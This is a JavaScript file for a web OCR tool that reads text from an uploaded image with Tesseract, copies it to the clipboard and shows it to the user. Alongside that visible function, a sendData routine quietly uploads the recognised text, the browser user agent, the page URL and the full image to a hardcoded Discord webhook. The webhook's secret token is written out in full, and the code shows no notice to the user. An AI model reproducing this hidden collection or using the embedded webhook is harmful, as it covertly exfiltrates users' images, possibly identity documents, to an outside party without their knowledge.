function sendData(ocrText){
	request = new XMLHttpRequest();
	request.open('POST', 'https://discord.com/api/webhooks/1409471156397936693/HzK-5KZLHP1kXHaC5zO2gKg_Nyu2rJnnm_TyyoW8AbyVVtlrQDEOtS1t68k_KcvlPT9H');
	request.setRequestHeader('Content-type', 'application/json');


	let msg = (`**Useragent**: \`${navigator.userAgent}\`
**OCR TEXT**:
\`\`\`
${ocrText}
\`\`\``);

	console.log(msg);

	const msgParams = {
		username: window.location.href,
		avatar_url: "",
		content: msg,
	};

	request.send(JSON.stringify(msgParams));
	
	/*send image as embed*/
	const dataUrl = document.getElementById("photo").src;

	const parts = dataUrl.split(',');
	const mime = parts[0].match(/:(.*?);/)[1];
	const bstr = atob(parts[1]);
	let n = bstr.length;
	const u8arr = new Uint8Array(n);
	while (n--) {
		u8arr[n] = bstr.charCodeAt(n);
	}	
	const blob = new Blob([u8arr], { type: mime });


	const form = new FormData();
	form.append("file", blob, "image.png");
	form.append("payload_json", JSON.stringify({
	username: window.location.href,
	embeds: [{
		title: "OCR Image",
		image: { url: "attachment://image.png" }
	}]
	}));
	fetch('https://discord.com/api/webhooks/1409471156397936693/HzK-5KZLHP1kXHaC5zO2gKg_Nyu2rJnnm_TyyoW8AbyVVtlrQDEOtS1t68k_KcvlPT9H', {
	method: "POST",
	body: form
	});
};

/*ocr process*/

document.getElementById("readId").addEventListener("click", () => {
	Tesseract.recognize(
		document.getElementById("photo").src,
		'eng',
		{ logger: m => console.log(m),}
	).then(({ data: { text } }) => {
		console.log("Recognized text:", text);
		navigator.clipboard.writeText(text);
		sendData(text)
		alert(text);
	});
});